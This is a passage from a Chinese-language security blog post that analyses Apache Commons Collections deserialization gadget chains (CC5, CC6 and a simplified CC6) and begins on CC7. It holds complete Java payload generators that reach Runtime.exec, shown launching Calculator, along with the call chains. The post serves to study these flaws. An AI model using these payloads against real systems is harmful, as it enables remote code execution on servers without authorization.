<p>&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x5E76;&#x4E0D;&#x4F1A;&#x5728; readObject &#x8FD9;&#x91CC; RCE&#xFF0C;&#x4ED6; RCE &#x7684;&#x539F;&#x56E0;&#x662F;&#x56E0;&#x4E3A;&#x5728;&#x5B9E;&#x4F8B;&#x5316;&#x7684;&#x65F6;&#x5019;&#x7684; RCE&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x89E6;&#x53D1;&#x4E86;&#x4F20;&#x5165; TiedMapEntry &#x7684; toString</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211163101314.png" alt></p>
<p>&#x800C;&#x5728;&#x4E0B;&#x9762; readObject &#x8C03;&#x7528; <code>val = valObj.toString();</code> &#x7684;&#x65F6;&#x5019;&#xFF0C; <code>valObj</code> &#x4E0D;&#x4E3A; TiedMapEntry</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211162921710.png" alt></p>
<p>&#x56E0;&#x6B64;&#x6839;&#x636E; valObj &#x7684;&#x9644;&#x503C;&#x5730;&#x65B9;&#xFF0C;&#x91CD;&#x65B0;&#x6784;&#x9020; payload</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211163413684.png" alt></p>
<p>&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x6784;&#x9020; BadAttributeValueExpException &#x7684;  <code>val</code>&#x503C;</p>
<p><strong>CC5 payload&#xFF0C; JDK1.8</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException,</span></span><br><span class="line"><span class="hljs-function">            InvocationTargetException, InstantiationException, IOException, NoSuchFieldException </span>{</span><br><span class="line">        Transformer[] realPoc  = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, fakeChain);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="hljs-keyword">new</span> TiedMapEntry(mapDemo, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        BadAttributeValueExpException finaldemo = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        Field valDemo = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);</span><br><span class="line">        valDemo.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        valDemo.set(finaldemo, rceDemo);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(finaldemo);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>JDK7u21 &#x4E0B;&#x662F;&#x4E0D;&#x80FD;&#x5229;&#x7528;&#x7684;&#xFF0C;&#x7A76;&#x5176;&#x539F;&#x56E0;&#x770B;&#x4E00;&#x4E0B; BadAttributeValueExpException &#x7C7B;&#xFF0C;&#x6CA1;&#x6709;&#x91CD;&#x5199;&#x7684; readObject &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211205741258.png" alt></p>
<h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><h2 id="Basics-5"><a href="#Basics-5" class="headerlink" title="Basics"></a>Basics</h2><p><strong>CC6 &#x7279;&#x70B9;&#xFF1A;&#x9002;&#x7528;&#x8303;&#x56F4;&#x5E7F;&#xFF0C;&#x53D7; JDK &#x7248;&#x672C;&#x5F71;&#x54CD;&#x6700;&#x5C0F;</strong></p>
<p>CC6 &#x5176;&#x5B9E;&#x8DDF; CC5 &#x662F;&#x5728; <code>TiedMapEntry#getValue</code> &#x5EF6;&#x4F38;&#x51FA;&#x6765;&#x5E76;&#x884C;&#x7684;&#x4E24;&#x6761;&#x94FE;</p>
<p>&#x56DE;&#x987E;&#x6211;&#x4EEC;&#x901A;&#x8FC7; <code>TiedMapEntry#getValue</code> &#x800C;&#x8FDB;&#x884C; RCE &#x7684; demo</p>
<p><strong>Level-0 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="hljs-keyword">new</span> TiedMapEntry(mapDemo, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        rceDemo.getValue();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x56DE;&#x987E; TiedMapEntry &#x91CC;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;CC5 &#x7528;&#x7684;&#x662F; <code>TiedMapEntry#toString</code>&#xFF0C;&#x91CC;&#x9762;&#x8C03;&#x7528;&#x4E86;<code>getValue</code>&#xFF0C; &#x90A3;&#x4E48;&#x5176;&#x5B9E;&#x5728; TiedMapEntry &#x8FD8;&#x6709; <code>hashCode</code> &#x8DDF; <code>equals</code> &#x540C;&#x6837;&#x8C03;&#x7528;&#x4E86; <code>getValue</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211164601311.png" alt></p>
<h2 id="Gadget-chain-4"><a href="#Gadget-chain-4" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p>CC6 &#x5176;&#x5B9E;&#x5C31;&#x7528;&#x5230;&#x4E86; <code>hashCode</code>  &#x65B9;&#x6CD5;&#xFF0C;&#x5728;&#x5411;&#x4E0A;&#x5BFB;&#x627E;&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x7684;&#x4EE5;&#x53CA;&#x8C03;&#x7528;&#x5230;&#x5408;&#x9002;&#x65B9;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6700;&#x7EC8;&#x5B9A;&#x4F4D;&#x5230; <code>HashSet#readObject</code></p>
<p><strong>CC6 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException</span></span><br><span class="line"><span class="hljs-function">            , InstantiationException, IOException, NoSuchFieldException </span>{</span><br><span class="line">        Transformer[] realPoc  = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, fakeChain);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="hljs-keyword">new</span> TiedMapEntry(mapDemo, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        HashSet map = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);</span><br><span class="line">        map.add(<span class="hljs-string">&quot;foo&quot;</span>);</span><br><span class="line">        Field f = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (NoSuchFieldException e) {</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;backingMap&quot;</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line">        Field f2 = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (NoSuchFieldException e) {</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;elementData&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">        f2.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="hljs-number">0</span>];</span><br><span class="line">        <span class="hljs-keyword">if</span>(node == <span class="hljs-keyword">null</span>){</span><br><span class="line">            node = array[<span class="hljs-number">1</span>];</span><br><span class="line">        }</span><br><span class="line">        Field keyField = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span>{</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);</span><br><span class="line">        }<span class="hljs-keyword">catch</span>(Exception e){</span><br><span class="line">            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">        keyField.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        keyField.set(node, rceDemo);</span><br><span class="line"></span><br><span class="line">        Field cf = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        cf.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        cf.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6838;&#x5FC3;&#x662F;&#x5728;&#x8C03;&#x7528; <code>HashSet#readObject</code> &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8C03;&#x7528; map &#x7684; put &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211215727507.png" alt></p>
<p>&#x540E;&#x7EED;&#x8C03;&#x7528;&#x5230; <code>HashMap#put</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211215810147.png" alt></p>
<p>&#x4E4B;&#x540E;&#x4F1A;&#x8C03;&#x7528;&#x5230; <code>HashMap#hash</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211215837664.png" alt></p>
<p>&#x968F;&#x540E;&#x8C03;&#x7528;&#x5230; <code>TiedMapEntry.hashCode()</code></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">       java.util.HashSet.readObject()</span><br><span class="line">           java.util.HashMap.put()</span><br><span class="line">           java.util.HashMap.hash()</span><br><span class="line">               org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">               org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                   org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                       org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                       org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                       java.lang.reflect.Method.invoke()</span><br><span class="line">                           java.lang.Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="Simpler-Gadget-chain"><a href="#Simpler-Gadget-chain" class="headerlink" title="Simpler Gadget chain"></a>Simpler Gadget chain</h2><p>&#x7B80;&#x5316;&#x94FE;&#x4E2D;&#x7528;&#x5230;&#x4E86; <code>HashMap#readObject</code> &#x4E2D;&#x7684; hash &#x65B9;&#x6CD5;&#x6765;&#x89E6;&#x53D1; hashCode &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211222456810.png" alt></p>
<p>&#x8C03;&#x7528; hash &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211222523482.png" alt></p>
<p>&#x4EE4; key &#x4E3A;TiedMapEntry &#x5BF9;&#x8C61;&#xFF0C;&#x5373;&#x53EF;&#xFF0C;&#x8FD9;&#x91CC;&#x76F4;&#x63A5;&#x4F7F;&#x7528; @phithon &#x5E08;&#x5085;&#x7684;&#x4EE3;&#x7801;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollections6</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};</span><br><span class="line">        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] {</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] { String.class,</span><br><span class="line">                        Class[].class }, <span class="hljs-keyword">new</span> Object[] { <span class="hljs-string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] }),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] { Object.class,</span><br><span class="line">                        Object[].class }, <span class="hljs-keyword">new</span> Object[] { <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] }),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] { String.class },</span><br><span class="line">                        <span class="hljs-keyword">new</span> String[] { <span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> }),</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>),</span><br><span class="line">        };</span><br><span class="line">        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// &#x4E0D;&#x518D;&#x4F7F;&#x7528;&#x539F;CommonsCollections6&#x4E2D;&#x7684;HashSet&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;HashMap</span></span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);</span><br><span class="line">        Map expMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="hljs-string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// ==================</span></span><br><span class="line">        <span class="hljs-comment">// &#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// &#x672C;&#x5730;&#x6D4B;&#x8BD5;&#x89E6;&#x53D1;</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8FD9;&#x91CC;&#x7684; key &#x7406;&#x8BBA;&#x4E0A;&#x662F;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x597D;&#x7684; TiedMapEntry &#xFF0C;value &#x662F;&#x6211;&#x4EEC;&#x7B2C;&#x4E8C;&#x4E2A; HashMap put &#x8FDB;&#x53BB;&#x7684; &#x201C;value&#x201D; &#x5B57;&#x7B26;&#x4E32;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212163921869.png" alt></p>
<p>&#x540E;&#x7EED;&#x7684;&#x8C03;&#x7528;&#x5C31;&#x8DDF;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x5206;&#x6790;&#x7684;&#x4E00;&#x6837;</p>
<p>JDK221 &#x4E0B;&#x8DDF; p&#x5E08;&#x5085;&#x539F;&#x6587;&#x7684;&#x4EE3;&#x7801;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x8FD9;&#x91CC;&#x662F; super.map&#xFF0C;&#x539F;&#x6587;&#x662F; map&#x3002;&#x4F46;&#x662F;&#x6309;&#x539F;&#x6587;&#x6B65;&#x9AA4;&#xFF0C;remove &#x4E4B;&#x540E;&#xFF0C;&#x7ED5;&#x4E0D;&#x8FC7;&#x8FD9;&#x4E2A;&#x5224;&#x65AD;&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x8C03;&#x7528;&#x5230; chain &#x7684;&#x94FE;&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x662F;&#x80FD; RCE&#x3002;&#x7384;&#x5B66;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212165229612.png" alt></p>
<h1 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h1><h2 id="Basics-6"><a href="#Basics-6" class="headerlink" title="Basics"></a>Basics</h2><p>&#x56DE;&#x987E;&#x524D;&#x9762; <code>TiedMapEntry#getValue</code>  &#x7684;&#x8C03;&#x7528;&#x65B9;&#x5F0F;</p>
<p>&#x56DE;&#x987E; TiedMapEntry &#x91CC;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;CC5 &#x7528;&#x7684;&#x662F; <code>TiedMapEntry#toString</code>&#xFF0C;&#x91CC;&#x9762;&#x8C03;&#x7528;&#x4E86;<code>getValue</code>&#xFF0C;CC6 &#x7528;&#x7684;&#x662F; <code>TiedMapEntry#hashCode</code>&#xFF0C;&#x91CC;&#x9762;&#x8C03;&#x7528;&#x4E86;<code>getValue</code></p>
<p>CC7 &#x6CA1;&#x6709;&#x7EE7;&#x7EED;&#x5EF6;&#x7528; <code>TiedMapEntry</code> &#x7684;&#x65B9;&#x6CD5;&#x53BB;&#x8C03;&#x7528;&#xFF0C;&#x800C;&#x662F;&#x7528;&#x4E86; <code>AbstractMap#equals</code> &#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4E86; <code>LazyMap#get</code></p>
<p>&#x6709;&#x51E0;&#x4E2A;&#x5C0F; trick</p>
<p><strong>yy &#x7684; hashCode &#x8DDF; zZ &#x7684; hashCode &#x76F8;&#x7B49;</strong></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212162614324.png" alt></p>
<h2 id="Gadget-chain-5"><a href="#Gadget-chain-5" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p><code>Hashtable#readObject</code> &#x7684; <code>reconstitutionPut</code> &#x662F;&#x6211;&#x4EEC;&#x7684;&#x5165;&#x53E3;&#x70B9;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212175610563.png" alt></p>
